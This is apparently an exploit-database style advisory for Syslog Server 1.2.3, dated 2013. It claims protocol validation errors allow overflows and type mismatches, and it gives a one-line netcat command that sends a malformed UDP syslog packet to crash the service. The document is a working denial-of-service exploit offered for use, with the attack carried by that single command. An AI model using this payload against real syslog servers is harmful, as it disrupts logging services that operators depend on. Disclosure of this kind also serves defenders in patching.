#!/usr/bin/python


#Exploit Title: Syslog Server 1.2.3
#Date: 12th June 2013
#Exploit Author: npn
#Exploit Author Homepage: http://www.iodigitalsec.com/
#Vendor Homepage: http://sourceforge.net/users/ghuysmans
#Software Link: http://download.cnet.com/Syslog-Server/3000-2085_4-75868875.html
#Version: 1.2.3
#Tested on: Windows XP SP3 English


This software suffers validation errors throughout the basic protocol implementation making it possible to cause overflows, type mismatches and so on. Here is a type mismatch crash:


echo "<pwn>pwn"|nc -u 192.168.200.20 514